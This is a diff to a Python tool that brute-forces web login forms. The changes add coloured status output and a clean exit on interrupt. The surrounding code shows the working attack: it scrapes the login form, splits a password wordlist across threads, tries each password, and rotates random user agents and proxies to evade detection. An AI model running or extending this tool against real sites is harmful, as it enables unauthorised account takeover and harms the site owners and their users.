@@ -7,6 +7,8 @@ from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 from itertools import cycle
+from colorama import Fore, Style
+from datetime import datetime
 
 # Function to parse arguments
 def parse_arguments():
@@ -33,20 +35,20 @@ def get_login_form_details(url):
     session = requests.Session()
     try:
         response = session.get(url, verify=False)  # Disable SSL verification if needed
-        print(f"Status Code: {response.status_code}")
-        print(f"Response Content: {response.text[:500]}")  # Print the first 500 characters for debugging
+        print(f"{Fore.YELLOW}[STATUS] Status Code: {response.status_code}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[STATUS] Response Content: {response.text[:500]}{Style.RESET_ALL}")  # Print the first 500 characters for debugging
     except requests.exceptions.RequestException as e:
-        print(f"Failed to retrieve the login page. Error: {e}")
+        print(f"{Fore.RED}[ERROR] Failed to retrieve the login page. Error: {e}{Style.RESET_ALL}")
         return None, None, None, None, None
 
     if response.status_code != 200:
-        print("Failed to retrieve the login page.")
+        print(f"{Fore.RED}[ERROR] Failed to retrieve the login page.{Style.RESET_ALL}")
         return None, None, None, None, None
 
     soup = BeautifulSoup(response.text, 'html.parser')
     form = soup.find('form')
     if not form:
-        print("No form found on the login page.")
+        print(f"{Fore.RED}[ERROR] No form found on the login page.{Style.RESET_ALL}")
         return None, None, None, None, None
 
     action_url = form.get('action', url)  # Default to the current URL if no action attribute is present
@@ -81,13 +83,13 @@ def attempt_login(session, action_url, method, username_field, password_field, c
             response = session.get(action_url, params=payload, headers=headers, proxies=proxy, allow_redirects=True)
 
         if response.url == redirect_url:
-            print(f"[SUCCESS] Login successful with password: {password}")
+            print(f"{Fore.GREEN}[SUCCESS] Login successful with password: {password}{Style.RESET_ALL}")
             return True
         else:
-            print(f"[FAILURE] Username: {username}, Password: {password}")
+            print(f"{Fore.RED}[FAILURE] Username: {username}, Password: {password}{Style.RESET_ALL}")
 
     except requests.exceptions.RequestException as e:
-        print(f"[ERROR] Request error: {e}")
+        print(f"{Fore.RED}[ERROR] Request error: {e}{Style.RESET_ALL}")
 
     return False
 
@@ -104,45 +106,50 @@ def worker(username, url, redirect_url, wordlist, headers, action_url, method, u
 
 # Main function to execute the script
 def main():
-    args = parse_arguments()
+    try:
+        args = parse_arguments()
 
-    with open(args.wordlist, 'r') as wordlist_file:
-        passwords = [line.strip() for line in wordlist_file]
+        with open(args.wordlist, 'r') as wordlist_file:
+            passwords = [line.strip() for line in wordlist_file]
 
-    action_url, method, username_field, password_field, csrf_token = get_login_form_details(args.url)
-    if not action_url:
-        return
+        action_url, method, username_field, password_field, csrf_token = get_login_form_details(args.url)
+        if not action_url:
+            return
 
-    # Use fake user-agent if --random-agent is specified
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded",
-    }
+        # Use fake user-agent if --random-agent is specified
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+        }
 
-    if args.random_agent:
-        ua = UserAgent()
-        headers["User-Agent"] = ua.random  # Random user agent for each request
-    else:
-        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        if args.random_agent:
+            ua = UserAgent()
+            headers["User-Agent"] = ua.random  # Random user agent for each request
+        else:
+            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
-    # Load proxies if specified
-    proxies = []
-    if args.proxy_list:
-        proxies = [get_random_proxy(args.proxy_list)]  # Load proxies as a list of one or more proxy dicts
+        # Load proxies if specified
+        proxies = []
+        if args.proxy_list:
+            proxies = [get_random_proxy(args.proxy_list)]  # Load proxies as a list of one or more proxy dicts
 
-    threads = []
-    chunk_size = len(passwords) // args.threads
-    for i in range(args.threads):
-        start = i * chunk_size
-        end = start + chunk_size if i < args.threads - 1 else len(passwords)
-        thread = threading.Thread(target=worker, args=(
-            args.username, args.url, args.redirect, passwords[start:end], headers,
-            action_url, method, username_field, password_field, csrf_token, proxies, args.delay
-        ))
-        threads.append(thread)
-        thread.start()
+        threads = []
+        chunk_size = len(passwords) // args.threads
+        for i in range(args.threads):
+            start = i * chunk_size
+            end = start + chunk_size if i < args.threads - 1 else len(passwords)
+            thread = threading.Thread(target=worker, args=(
+                args.username, args.url, args.redirect, passwords[start:end], headers,
+                action_url, method, username_field, password_field, csrf_token, proxies, args.delay
+            ))
+            threads.append(thread)
+            thread.start()
 
-    for thread in threads:
-        thread.join()
+        for thread in threads:
+            thread.join()
+
+    except KeyboardInterrupt:
+        print(f"{Fore.RED}{Style.BRIGHT}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ERROR] User quit.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Ending @ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
